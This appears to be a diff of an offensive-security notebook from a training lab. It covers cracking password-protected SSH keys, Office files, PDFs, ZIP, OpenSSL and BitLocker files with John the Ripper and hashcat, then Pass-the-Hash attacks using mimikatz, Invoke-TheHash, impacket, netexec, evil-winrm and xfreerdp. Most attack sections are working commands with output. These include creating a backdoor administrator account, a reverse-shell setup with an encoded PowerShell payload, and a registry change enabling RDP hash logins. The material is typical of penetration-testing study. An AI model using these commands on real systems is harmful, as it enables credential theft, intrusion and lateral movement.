+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
+
+8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
+4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
+</code></pre>
+<p>Modern SSH keys appear the same whether encrypted or not. To check if a key is encrypted:</p>
+<pre><code class="language-bash">ssh-keygen -yf ~/.ssh/id_ed25519
+# Unencrypted: outputs public key
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6
+
+ssh-keygen -yf ~/.ssh/id_rsa
+# Encrypted: prompts for passphrase
+Enter passphrase for "/home/jsmith/.ssh/id_rsa":
+</code></pre>
+<hr>
+<h2 id="john-the-ripper-2john-tools"><a class="header" href="#john-the-ripper-2john-tools">John the Ripper 2john Tools</a></h2>
+<p>JtR includes many scripts for extracting hashes from files. Find available tools:</p>
+<pre><code class="language-bash">locate *2john*
+</code></pre>
+<p>Common 2john tools:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ssh2john.py</code></td><td>SSH private keys</td></tr>
+<tr><td><code>office2john.py</code></td><td>MS Office documents</td></tr>
+<tr><td><code>pdf2john.py</code></td><td>PDF files</td></tr>
+<tr><td><code>zip2john</code></td><td>ZIP archives</td></tr>
+<tr><td><code>rar2john</code></td><td>RAR archives</td></tr>
+<tr><td><code>7z2john.pl</code></td><td>7-Zip archives</td></tr>
+<tr><td><code>keepass2john</code></td><td>KeePass databases</td></tr>
+<tr><td><code>bitlocker2john</code></td><td>BitLocker volumes</td></tr>
+<tr><td><code>gpg2john</code></td><td>GPG keys</td></tr>
+<tr><td><code>putty2john</code></td><td>PuTTY private keys</td></tr>
+<tr><td><code>truecrypt_volume2john</code></td><td>TrueCrypt volumes</td></tr>
+<tr><td><code>dmg2john</code></td><td>macOS DMG files</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="cracking-encrypted-ssh-keys-1"><a class="header" href="#cracking-encrypted-ssh-keys-1">Cracking Encrypted SSH Keys</a></h2>
+<p>Use <code>ssh2john.py</code> to extract the hash, then crack with JtR:</p>
+<pre><code class="language-bash">ssh2john.py SSH.private &gt; ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+</code></pre>
+<p>Output:</p>
+<pre><code>Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1234         (SSH.private)
+1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
+Session completed
+</code></pre>
+<p>View cracked password:</p>
+<pre><code class="language-bash">john ssh.hash --show
+
+SSH.private:1234
+
+1 password hash cracked, 0 left
+</code></pre>
+<hr>
+<h2 id="cracking-password-protected-documents-1"><a class="header" href="#cracking-password-protected-documents-1">Cracking Password-Protected Documents</a></h2>
+<p>Most reports, documentation, and information sheets are distributed as Microsoft Office documents or PDFs.</p>
+<h3 id="cracking-office-documents"><a class="header" href="#cracking-office-documents">Cracking Office Documents</a></h3>
+<pre><code class="language-bash">office2john.py Protected.docx &gt; protected-docx.hash
+john --wordlist=rockyou.txt protected-docx.hash
+john protected-docx.hash --show
+
+Protected.docx:1234
+
+1 password hash cracked, 0 left
+</code></pre>
+<h3 id="cracking-pdf-files"><a class="header" href="#cracking-pdf-files">Cracking PDF Files</a></h3>
+<pre><code class="language-bash">pdf2john.py PDF.pdf &gt; pdf.hash
+john --wordlist=rockyou.txt pdf.hash
+john pdf.hash --show
+
+PDF.pdf:1234
+
+1 password hash cracked, 0 left
+</code></pre>
+<hr>
+<h2 id="cracking-protected-archives-3"><a class="header" href="#cracking-protected-archives-3">Cracking Protected Archives</a></h2>
+<p>Archives allow organizing documents in a structured manner before compressing them into a single file. Many archive types support password protection.</p>
+<h3 id="common-archive-types-1"><a class="header" href="#common-archive-types-1">Common Archive Types</a></h3>
+<p>Common extensions include: <code>tar</code>, <code>gz</code>, <code>rar</code>, <code>zip</code>, <code>vmdb/vmx</code>, <code>cpt</code>, <code>truecrypt</code>, <code>bitlocker</code>, <code>kdbx</code>, <code>deb</code>, <code>7z</code>, and <code>gzip</code>.</p>
+<h3 id="collecting-archive-extensions"><a class="header" href="#collecting-archive-extensions">Collecting Archive Extensions</a></h3>
+<p>Query FileInfo for a comprehensive list:</p>
+<pre><code class="language-bash">curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
+</code></pre>
+<p>Note: Not all archive types support native password protection. In such cases, additional tools like <code>openssl</code> or <code>gpg</code> are used to encrypt the files.</p>
+<hr>
+<h2 id="cracking-zip-files-1"><a class="header" href="#cracking-zip-files-1">Cracking ZIP Files</a></h2>
+<pre><code class="language-bash">zip2john ZIP.zip &gt; zip.hash
+cat zip.hash
+# ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
+
+john --wordlist=rockyou.txt zip.hash
+john zip.hash --show
+
+ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip
+
+1 password hash cracked, 0 left
+</code></pre>
+<hr>
+<h2 id="cracking-openssl-encrypted-gzip-files-2"><a class="header" href="#cracking-openssl-encrypted-gzip-files-2">Cracking OpenSSL Encrypted GZIP Files</a></h2>
+<p>GZIP files don’t natively support password protection and are often encrypted using <code>openssl</code>. Identify such files with the <code>file</code> command:</p>
+<pre><code class="language-bash">file GZIP.gzip
+# GZIP.gzip: openssl enc'd data with salted password
+</code></pre>
+<p>When cracking OpenSSL encrypted files, a reliable approach is to use <code>openssl</code> within a loop that attempts to extract contents directly:</p>
+<pre><code class="language-bash">for i in $(cat rockyou.txt); do
+  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null | tar xz
+done
+</code></pre>
+<p>GZIP-related error messages can be safely ignored:</p>
+<pre><code>gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+</code></pre>
+<p>When the correct password is found, the file is extracted to the current directory:</p>
+<pre><code class="language-bash">ls
+# customers.csv  GZIP.gzip  rockyou.txt
+</code></pre>
+<hr>
+<h2 id="cracking-bitlocker-encrypted-drives-2"><a class="header" href="#cracking-bitlocker-encrypted-drives-2">Cracking BitLocker-Encrypted Drives</a></h2>
+<p>BitLocker is a full-disk encryption feature developed by Microsoft for Windows. Available since Windows Vista, it uses AES with 128-bit or 256-bit key lengths. If the password or PIN is forgotten, decryption can still be performed using a recovery key—a 48-digit string generated during setup.</p>
+<h3 id="extracting-bitlocker-hashes"><a class="header" href="#extracting-bitlocker-hashes">Extracting BitLocker Hashes</a></h3>
+<p>Use <code>bitlocker2john</code> to extract four different hashes:</p>
+<ul>
+<li>First two: BitLocker password</li>
+<li>Last two: Recovery key (48-digit, randomly generated—impractical to crack)</li>
+</ul>
+<pre><code class="language-bash">bitlocker2john -i Backup.vhd &gt; backup.hashes
+grep "bitlocker\$0" backup.hashes &gt; backup.hash
+cat backup.hash
+
+# $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f
+</code></pre>
+<h3 id="cracking-with-john-the-ripper"><a class="header" href="#cracking-with-john-the-ripper">Cracking with John the Ripper</a></h3>
+<pre><code class="language-bash">john --wordlist=rockyou.txt backup.hash
+</code></pre>
+<h3 id="cracking-with-hashcat"><a class="header" href="#cracking-with-hashcat">Cracking with Hashcat</a></h3>
+<p>The hashcat mode for <code>$bitlocker$0$...</code> hashes is <code>-m 22100</code>:</p>
+<pre><code class="language-bash">hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>Output:</p>
+<pre><code>Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 22100 (BitLocker)
+Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
+Time.Started.....: Sat Apr 19 17:49:25 2025 (1 min, 56 secs)
+Time.Estimated...: Sat Apr 19 17:51:21 2025 (0 secs)
+Speed.#1.........:       25 H/s (9.28ms) @ Accel:64 Loops:4096 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2880/14344385 (0.02%)
+Candidates.#1....: pirate -&gt; soccer9
+
+$bitlocker$0$...:1234qwer
+</code></pre>
+<p>Note: BitLocker uses strong AES encryption, so cracking may take considerable time depending on hardware.</p>
+<hr>
+<h2 id="mounting-bitlocker-drives"><a class="header" href="#mounting-bitlocker-drives">Mounting BitLocker Drives</a></h2>
+<h3 id="windows-2"><a class="header" href="#windows-2">Windows</a></h3>
+<ol>
+<li>Double-click the <code>.vhd</code> file (Windows will initially show an error since it’s encrypted)</li>
+<li>After mounting, double-click the BitLocker volume</li>
+<li>Enter the password when prompted</li>
+</ol>
+<h3 id="linux-or-macos"><a class="header" href="#linux-or-macos">Linux (or macOS)</a></h3>
+<p>Install <code>dislocker</code>:</p>
+<pre><code class="language-bash">sudo apt-get install dislocker
+</code></pre>
+<p>Create mount directories:</p>
+<pre><code class="language-bash">sudo mkdir -p /media/bitlocker
+sudo mkdir -p /media/bitlockermount
+</code></pre>
+<p>Configure VHD as loop device, decrypt, and mount:</p>
+<pre><code class="language-bash">sudo losetup -f -P Backup.vhd
+sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
+sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+</code></pre>
+<p>Browse the files:</p>
+<pre><code class="language-bash">cd /media/bitlockermount/
+ls -la
+</code></pre>
+<p>Unmount when done:</p>
+<pre><code class="language-bash">sudo umount /media/bitlockermount
+sudo umount /media/bitlocker
+</code></pre>
+<hr>
+<h2 id="hashcat-modes-for-files-and-archives"><a class="header" href="#hashcat-modes-for-files-and-archives">Hashcat Modes for Files and Archives</a></h2>
+<h3 id="protected-files"><a class="header" href="#protected-files">Protected Files</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Mode</th><th>Type</th></tr>
+</thead>
+<tbody>
+<tr><td><code>9400</code></td><td>MS Office 2007</td></tr>
+<tr><td><code>9500</code></td><td>MS Office 2010</td></tr>
+<tr><td><code>9600</code></td><td>MS Office 2013</td></tr>
+<tr><td><code>10400</code></td><td>PDF 1.1-1.3 (Acrobat 2-4)</td></tr>
+<tr><td><code>10500</code></td><td>PDF 1.4-1.6 (Acrobat 5-8)</td></tr>
+<tr><td><code>10600</code></td><td>PDF 1.7 Level 3 (Acrobat 9)</td></tr>
+<tr><td><code>10700</code></td><td>PDF 1.7 Level 8 (Acrobat 10-11)</td></tr>
+<tr><td><code>13400</code></td><td>KeePass 1/2 AES/Twofish</td></tr>
+<tr><td><code>22100</code></td><td>BitLocker</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="protected-archives"><a class="header" href="#protected-archives">Protected Archives</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Mode</th><th>Type</th></tr>
+</thead>
+<tbody>
+<tr><td><code>11600</code></td><td>7-Zip</td></tr>
+<tr><td><code>13600</code></td><td>WinZip</td></tr>
+<tr><td><code>17200</code></td><td>PKZIP (Compressed)</td></tr>
+<tr><td><code>17210</code></td><td>PKZIP (Uncompressed)</td></tr>
+<tr><td><code>17220</code></td><td>PKZIP (Compressed Multi-File)</td></tr>
+<tr><td><code>17225</code></td><td>PKZIP (Mixed Multi-File)</td></tr>
+<tr><td><code>12500</code></td><td>RAR3-hp</td></tr>
+<tr><td><code>13000</code></td><td>RAR5</td></tr>
+<tr><td><code>23700</code></td><td>RAR3-p (Compressed)</td></tr>
+<tr><td><code>23800</code></td><td>RAR3-p (Uncompressed)</td></tr>
+<tr><td><code>6211-6243</code></td><td>TrueCrypt</td></tr>
+<tr><td><code>13711-13723</code></td><td>VeraCrypt</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="key-considerations"><a class="header" href="#key-considerations">Key Considerations</a></h2>
+<p>One of the primary challenges in cracking protected files is the generation and mutation of password lists. In many cases, using standard or publicly known password lists is no longer sufficient, as such lists are often recognized and blocked by built-in security mechanisms.</p>
+<p>Files may also be more difficult to crack—or not crackable at all within a reasonable timeframe—because users are increasingly required to choose longer, randomly generated passwords or complex passphrases.</p>
+<p>Nevertheless, attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="crawling"><a class="header" href="#crawling">Crawling</a></h1>
 <p>Crawling (or spidering) is the automated process of systematically browsing the web to index and collect information from websites. It is commonly used by search engines to gather data for indexing, but it can also be employed for various other purposes, including security assessments, data mining, and competitive analysis. Crawlers, also known as spiders or bots, follow links on web pages to discover new content and extract relevant information.</p>
@@ -29084,10 +30684,6 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 <li>The National Vulnerability Database (NVD) provides on online calculator here: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="openvas"><a href="#openvas" class="header">openvas</a></h1>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="nessus"><a href="#nessus" class="header">nessus</a></h1>
-<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="laudanum"><a class="header" href="#laudanum">Laudanum</a></h1>
 <h2 id="overview-14"><a class="header" href="#overview-14">Overview</a></h2>
 <p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell. It is designed to be easy to use and customizable for different scenarios.</p>
@@ -29605,14 +31201,14 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 mimikatz # sekurlsa::credman
 </code></pre>
 <p>Alternative: manually decrypt using the <code>dpapi</code> module.</p>
-<h2 id="related-tools-5"><a class="header" href="#related-tools-5">Related Tools</a></h2>
+<h2 id="related-tools-7"><a class="header" href="#related-tools-7">Related Tools</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
 <tr><th>Tool</th><th>Description</th></tr>
 </thead>
 <tbody>
-<tr><td><a href="tools/mimikatz.html">Mimikatz</a></td><td>Windows credential extraction and manipulation</td></tr>
+<tr><td><a href="#mimikatz">Mimikatz</a></td><td>Windows credential extraction and manipulation</td></tr>
 <tr><td>SharpDPAPI</td><td>C# implementation for DPAPI attacks</td></tr>
 <tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
 <tr><td>DonPAPI</td><td>Remote DPAPI credential extraction</td></tr>
@@ -29879,10 +31475,10 @@ NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  [-] Error while dumping NTDS
 sudo cp /etc/shadow /tmp/shadow.bak
 unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
 </code></pre>
-<h3 id="cracking-with-hashcat"><a class="header" href="#cracking-with-hashcat">Cracking with hashcat</a></h3>
+<h3 id="cracking-with-hashcat-1"><a class="header" href="#cracking-with-hashcat-1">Cracking with hashcat</a></h3>
 <pre><code class="language-sh">hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 </code></pre>
-<h3 id="cracking-with-john-the-ripper"><a class="header" href="#cracking-with-john-the-ripper">Cracking with John the Ripper</a></h3>
+<h3 id="cracking-with-john-the-ripper-1"><a class="header" href="#cracking-with-john-the-ripper-1">Cracking with John the Ripper</a></h3>
 <p>John’s single crack mode is ideal for this scenario as it uses GECOS/username data:</p>
 <pre><code class="language-sh">john --single /tmp/unshadowed.hashes
 </code></pre>
@@ -29904,6 +31500,742 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
 </tbody>
 </table>
 </div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="pass-the-hash-pth-attacks"><a class="header" href="#pass-the-hash-pth-attacks">Pass the Hash (PtH) Attacks</a></h1>
+<p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn’t need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p>
+<h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
+<p>The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p>
+<ul>
+<li>Dumping the local SAM database from a compromised host</li>
+<li>Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller</li>
+<li>Pulling the hashes from memory (lsass.exe)</li>
+</ul>
+<h2 id="windows-ntlm-background"><a class="header" href="#windows-ntlm-background">Windows NTLM Background</a></h2>
+<p>Microsoft’s Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users’ identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user’s identity without having them provide a password.</p>
+<p>Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.</p>
+<p>With NTLM, passwords stored on the server and domain controller are not “salted,” which means that an adversary with a password hash can authenticate a session without knowing the original password. This is what makes Pass the Hash attacks possible.</p>
+<hr>
+<h2 id="pass-the-hash-from-windows"><a class="header" href="#pass-the-hash-from-windows">Pass the Hash from Windows</a></h2>
+<h3 id="using-mimikatz"><a class="header" href="#using-mimikatz">Using Mimikatz</a></h3>
+<p>Mimikatz has a module named <code>sekurlsa::pth</code> that allows us to perform a Pass the Hash attack by starting a process using the hash of the user’s password.</p>
+<p><strong>Required Parameters:</strong></p>
+<ul>
+<li><code>/user</code> - The user name we want to impersonate</li>
+<li><code>/rc4</code> or <code>/NTLM</code> - NTLM hash of the user’s password</li>
+<li><code>/domain</code> - Domain the user belongs to. For local accounts, use the computer name, localhost, or a dot (.)</li>
+<li><code>/run</code> - The program to run with the user’s context (defaults to cmd.exe)</li>
+</ul>
+<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
+user    : julio
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 64F12CDDAA88057E06A81B54E73B949B
+  |  PID  8404
+  |  TID  4268
+  |  LSA Process was already R/W
+  |  LUID 0 ; 5218172 (00000000:004f9f7c)
+  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
+  \_ kerberos - data copy @ 0000028FC964F288
+   \_ des_cbc_md4       -&gt; null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 0000028FC9673AE8 (32) -&gt; null
+</code></pre>
+<p>Now you can use the spawned cmd.exe to execute commands in the user’s context.</p>
+<h3 id="using-invoke-thehash-powershell"><a class="header" href="#using-invoke-thehash-powershell">Using Invoke-TheHash (PowerShell)</a></h3>
+<p>Invoke-TheHash is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol.</p>
+<p><strong>Note:</strong> Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.</p>
+<p><strong>Required Parameters:</strong></p>
+<ul>
+<li><code>Target</code> - Hostname or IP address of the target</li>
+<li><code>Username</code> - Username to use for authentication</li>
+<li><code>Domain</code> - Domain to use for authentication (unnecessary with local accounts or when using @domain after the username)</li>
+<li><code>Hash</code> - NTLM password hash for authentication (accepts LM:NTLM or NTLM format)</li>
+<li><code>Command</code> - Command to execute on the target</li>
+</ul>
+<h4 id="smb-execution-example"><a class="header" href="#smb-execution-example">SMB Execution Example</a></h4>
+<p>Create a new user and add to Administrators group:</p>
+<pre><code class="language-powershell">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash&gt; Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add" -Verbose
+
+VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
+VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
+VERBOSE: [*] Trying to execute command on 172.16.1.10
+[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
+</code></pre>
+<h4 id="wmi-execution-example-reverse-shell"><a class="header" href="#wmi-execution-example-reverse-shell">WMI Execution Example (Reverse Shell)</a></h4>
+<p>First, start a netcat listener:</p>
+<pre><code class="language-powershell">PS C:\tools&gt; .\nc.exe -lvnp 8001
+listening on [any] 8001 ...
+</code></pre>
+<p>Generate a PowerShell reverse shell payload (e.g., using https://revshells.com with PowerShell #3 Base64 option), then execute:</p>
+<pre><code class="language-powershell">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e &lt;BASE64_ENCODED_PAYLOAD&gt;"
+</code></pre>
+<hr>
+<h2 id="pass-the-hash-from-linux"><a class="header" href="#pass-the-hash-from-linux">Pass the Hash from Linux</a></h2>
+<h3 id="using-impacket"><a class="header" href="#using-impacket">Using Impacket</a></h3>
+<p>Impacket has several tools that support authentication via Pass the Hash, including:</p>
+<ul>
+<li><code>impacket-psexec</code></li>
+<li><code>impacket-wmiexec</code></li>
+<li><code>impacket-atexec</code></li>
+<li><code>impacket-smbexec</code></li>
+</ul>
+<h4 id="psexec-example"><a class="header" href="#psexec-example">PsExec Example</a></h4>
+<pre><code class="language-bash">$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.201.126.....
+[*] Found writable share ADMIN$
+[*] Uploading file SLUBMRXK.exe
+[*] Opening SVCManager on 10.129.201.126.....
+[*] Creating service BnEU on 10.129.201.126.....
+[*] Starting service BnEU.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19041.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre>
+<h3 id="using-netexec"><a class="header" href="#using-netexec">Using NetExec</a></h3>
+<p>NetExec (formerly CrackMapExec) can execute commands using Pass the Hash.</p>
+<pre><code class="language-bash">$ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+
+SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
+SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+SMB         10.129.201.126  445    MS01            [+] Executed command 
+SMB         10.129.201.126  445    MS01            MS01\administrator
+</code></pre>
+<h3 id="using-evil-winrm"><a class="header" href="#using-evil-winrm">Using evil-winrm</a></h3>
+<p>Evil-WinRM can authenticate using Pass the Hash with PowerShell remoting. Useful if SMB is blocked or you don’t have administrative rights.</p>
+<pre><code class="language-bash">$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
+</code></pre>
+<p><strong>Note:</strong> When using a domain account, include the domain name: <code>administrator@inlanefreight.htb</code></p>
+<h3 id="using-rdp-with-xfreerdp"><a class="header" href="#using-rdp-with-xfreerdp">Using RDP with xfreerdp</a></h3>
+<p>RDP PtH attacks can gain GUI access to the target system.</p>
+<p><strong>Caveats:</strong></p>
+<ul>
+<li>Restricted Admin Mode must be enabled on the target (disabled by default)</li>
+</ul>
+<h4 id="enable-restricted-admin-mode"><a class="header" href="#enable-restricted-admin-mode">Enable Restricted Admin Mode</a></h4>
+<p>On the target, add the registry key:</p>
+<pre><code class="language-cmd">c:\tools&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+</code></pre>
+<h4 id="connect-via-rdp"><a class="header" href="#connect-via-rdp">Connect via RDP</a></h4>
+<pre><code class="language-bash">$ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+</code></pre>
+<hr>
+<h2 id="uac-limitations-for-local-accounts"><a class="header" href="#uac-limitations-for-local-accounts">UAC Limitations for Local Accounts</a></h2>
+<p>UAC (User Account Control) limits local users’ ability to perform remote administration operations.</p>
+<h3 id="localaccounttokenfilterpolicy"><a class="header" href="#localaccounttokenfilterpolicy">LocalAccountTokenFilterPolicy</a></h3>
+<p>When <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> is set to:</p>
+<ul>
+<li><strong>0</strong> - Only the built-in local admin account (RID-500, “Administrator”) can perform remote administration tasks</li>
+<li><strong>1</strong> - Other local admins are also allowed</li>
+</ul>
+<h3 id="filteradministratortoken"><a class="header" href="#filteradministratortoken">FilterAdministratorToken</a></h3>
+<p>If the registry key <code>FilterAdministratorToken</code> (disabled by default) is enabled (value 1), the RID 500 account is enrolled in UAC protection. This means remote PtH will fail against the machine when using that account.</p>
+<p><strong>Important:</strong> These settings only apply to local administrative accounts. Domain accounts with administrative rights on a computer can still use Pass the Hash.</p>
+<hr>
+<h2 id="mitigations-1"><a class="header" href="#mitigations-1">Mitigations</a></h2>
+<ul>
+<li>Limit use of local administrator accounts</li>
+<li>Use unique passwords for local administrator accounts across machines</li>
+<li>Enable Protected Users group membership for sensitive accounts</li>
+<li>Implement Credential Guard</li>
+<li>Monitor for PtH indicators (e.g., NTLM authentication events, unusual logon patterns)</li>
+<li>Regularly rotate privileged account passwords</li>
+</ul>
+<h2 id="references-4"><a class="header" href="#references-4">References</a></h2>
+<ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Documentation</a></li>
+<li><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a></li>
+<li><a href="https://www.netexec.wiki/">NetExec Wiki</a></li>
+<li><a href="https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="pass-the-ticket-ptt-attacks"><a class="header" href="#pass-the-ticket-ptt-attacks">Pass the Ticket (PtT) Attacks</a></h1>
+<p>A Pass the Ticket (PtT) attack uses a stolen Kerberos ticket to move laterally in an Active Directory environment instead of an NTLM password hash. This technique leverages the Kerberos authentication protocol to access resources without needing the user’s plaintext password.</p>
+<h2 id="kerberos-protocol-overview"><a class="header" href="#kerberos-protocol-overview">Kerberos Protocol Overview</a></h2>
+<p>The Kerberos authentication system is ticket-based. Instead of giving an account password to every service, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service.</p>
+<h3 id="key-components"><a class="header" href="#key-components">Key Components</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Component</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>TGT</strong> (Ticket Granting Ticket)</td><td>First ticket obtained on a Kerberos system. Permits the client to obtain additional Kerberos tickets (TGS).</td></tr>
+<tr><td><strong>TGS</strong> (Ticket Granting Service)</td><td>Requested by users who want to use a service. Allows services to verify the user’s identity.</td></tr>
+<tr><td><strong>KDC</strong> (Key Distribution Center)</td><td>Issues tickets to clients. Usually runs on the Domain Controller.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="authentication-flow"><a class="header" href="#authentication-flow">Authentication Flow</a></h3>
+<ol>
+<li>User requests a TGT by authenticating to the DC (encrypting current timestamp with their password hash)</li>
